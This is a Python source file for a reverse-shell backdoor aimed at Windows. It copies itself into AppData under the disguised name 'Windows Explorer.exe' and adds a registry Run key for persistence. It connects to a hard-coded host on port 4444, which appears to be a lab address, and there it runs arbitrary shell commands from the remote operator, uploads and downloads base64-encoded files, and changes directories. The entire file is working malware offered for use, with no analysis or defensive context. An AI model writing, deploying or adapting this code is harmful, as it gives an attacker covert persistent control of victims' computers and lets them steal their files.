import subprocess, json, os, base64, sys, socket, shutil
import logging

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.connection.connect((ip, port))
            logging.info(f"Connected to {ip}:{port}")
        except Exception as e:
            logging.error(f"Connection failed: {e}")
            sys.exit()

    def become_persistence(self):
        try:
            file_location_to_store = os.environ["appdata"] + "\\Windows Explorer.exe"  # Use unique name to avoid conflicts
            if not os.path.exists(file_location_to_store):
                shutil.copyfile(sys.executable, file_location_to_store)
                subprocess.call('reg add HKCU\Software\Microsoft\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location_to_store + '"', shell=True)
                logging.info("Persistence established")
            else:
                logging.info("Persistence already established")
        except Exception as e:
            logging.error(f"Failed to establish persistence: {e}")

    def execute_sys_command(self, command):
        try:
            DEVNULL = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except Exception as e:
            logging.error(f"Command execution failed: {e}")
            return f"[-] Error during command execution: {e}"

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())  # Encode data for sending
            logging.debug(f"Sent: {data}")
        except Exception as e:
            logging.error(f"Failed to send data: {e}")

    def reliable_receive(self):
        try:
            json_data = self.connection.recv(1024).decode()  # Decode received data
            logging.debug(f"Received: {json_data}")
            return json.loads(json_data)
        except Exception as e:
            logging.error(f"Failed to receive data: {e}")
            return None

    def read_file(self, path):
        try:
            with open(path, "rb+") as file:
                return base64.b64encode(file.read()).decode()  # Decode for sending
        except Exception as e:
            logging.error(f"Failed to read file: {e}")
            return f"[-] Error reading file: {e}"

    def write_file(self, path, content):
        try:
            with open(path, "wb+") as file:
                file.write(base64.b64decode(content))  # Decode content before writing
            return "[+] Uploaded Successfully"
        except Exception as e:
            logging.error(f"Failed to write file: {e}")
            return f"[-] Error writing file: {e}"

    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return "[+] Changing the directory to " + path
        except Exception as e:
            logging.error(f"Failed to change directory: {e}")
            return f"[-] Error changing directory: {e}"

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if command:
                    if command[0] == "exit":
                        self.connection.close()
                        logging.info("Exiting...")
                        sys.exit()
                    elif command[0] == "cd" and len(command) > 1:
                        result = self.change_working_directory(command[1])
                    elif command[0] == "download":
                        result = self.read_file(command[1])
                    elif command[0] == "upload":
                        result = self.write_file(command[1], command[2])
                    else:
                        result = self.execute_sys_command(command)
                    self.reliable_send(result)
                else:
                    logging.warning("Received empty command")
            except Exception as e:
                logging.error(f"Error in main loop: {e}")
                break

if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    try:
        backdoor = Backdoor("10.0.2.4", 4444)
        backdoor.run()
    except Exception as e:
        logging.error(f"Main execution failed: {e}")
        sys.exit()